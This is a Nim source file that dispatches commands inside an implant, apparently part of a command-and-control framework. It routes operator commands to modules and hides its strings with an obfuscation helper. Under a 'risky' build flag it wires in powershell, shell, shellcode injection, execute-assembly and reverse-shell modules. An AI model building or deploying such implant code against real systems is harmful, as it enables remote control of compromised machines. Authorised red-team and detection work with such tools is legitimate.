#[
    Application Service: CommandService
    Encapsulates command execution logic
    Applies Single Responsibility Principle
    Uses CommandModuleRegistry for dependency inversion
    Refactored to comply with SOLID principles (SRP, OCP, DIP)
]#

import strutils, options
# Import obfuscation through adapter layer (not directly from util)
from ../../infrastructure/adapters/string_obfuscation_adapter import obf
# Import domain models
import ../../domain/models/[implant, network_command_context]
# Import command module registry
import ../../infrastructure/adapters/command_module_registry

# Risky commands (when enabled) - TODO: Create adapter for risky commands
when defined risky:
    include ../../infrastructure/modules/risky/[executeAssembly, inlineExecute, powershell, shell, shinject, reverseShell]

type
    CommandService* = object
        ## Service for executing commands
        ## Uses CommandModuleRegistry to delegate to appropriate adapters
        commandModuleRegistry*: CommandModuleRegistry

proc newCommandService*(): CommandService =
    ## Create a new CommandService instance
    result = CommandService(
        commandModuleRegistry: newCommandModuleRegistry()
    )

proc executeCommand*(service: CommandService, implant: Implant, cmd: string, cmdGuid: string, args: seq[string]): string =
    ## Execute a command and return the result
    ## Delegates to CommandModuleRegistry which routes to appropriate adapter
    ## Applies Dependency Inversion Principle - depends on ports, not implementations
    
    when defined debug:
        let argsStr = if args.len > 0: " " & args.join(" ") else: ""
        echo "[DEBUG] CommandService: Executing command: " & cmd & argsStr
    
    try:
        # Check if command requires network context
        let requiresNetworkContext = service.commandModuleRegistry.getCommandModule(cmd).requiresNetworkContext
        
        # Create network context only if needed
        var networkCtx: Option[NetworkCommandContext] = none(NetworkCommandContext)
        if requiresNetworkContext:
            networkCtx = some(implant.toNetworkContext())
        
        # Execute command using registry
        result = service.commandModuleRegistry.executeCommand(cmd, args, cmdGuid, networkCtx)
        
        # Handle risky commands if enabled (temporary until adapter created)
        when defined risky:
            if result == obf("ERROR: An unknown command was received."):
                # Fallback to risky commands
                if cmd == obf("execute-assembly"):
                    networkCtx = some(implant.toNetworkContext())
                    result = obf("ERROR: Risky commands need refactoring")
                elif cmd == obf("inline-execute"):
                    networkCtx = some(implant.toNetworkContext())
                    result = obf("ERROR: Risky commands need refactoring")
                elif cmd == obf("powershell"):
                    result = powershell(args)
                elif cmd == obf("shell"):
                    result = shell(args)
                elif cmd == obf("shinject"):
                    networkCtx = some(implant.toNetworkContext())
                    result = obf("ERROR: Risky commands need refactoring")
                elif cmd == obf("reverse-shell"):
                    result = reverseShell(args)
    
    except Exception:
        let msg = getCurrentExceptionMsg()
        result = obf("ERROR: An unhandled exception occurred.\nException: ") & msg
        
        when defined debug:
            echo "[DEBUG] CommandService: Exception occurred: " & msg
    
    when defined debug:
        echo "[DEBUG] CommandService: Command result: " & result

